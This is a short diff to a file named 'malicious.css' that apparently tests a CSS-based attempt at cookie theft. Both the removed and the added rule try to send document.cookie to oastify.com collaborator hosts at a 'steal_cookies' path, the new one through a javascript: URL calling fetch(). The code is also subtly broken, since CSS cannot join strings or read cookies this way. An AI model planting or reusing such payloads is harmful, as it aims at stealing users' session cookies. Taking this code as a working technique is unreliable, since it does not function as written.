@@ -1,4 +1,3 @@
-/* Arquivo: malicious.css */
-div {
-  background-image: url("https://wqq6ji4rw2tx5zsnnd0tsgtae1ks8xwm.oastify.com/steal_cookies?cookie=" + encodeURIComponent(document.cookie));
+body {
+  background-image: url("javascript:fetch('https://sc825eqniyftrvej99mpecf60x6oufn3c.oastify.com/steal_cookies?cookie=' + document.cookie)");
 }
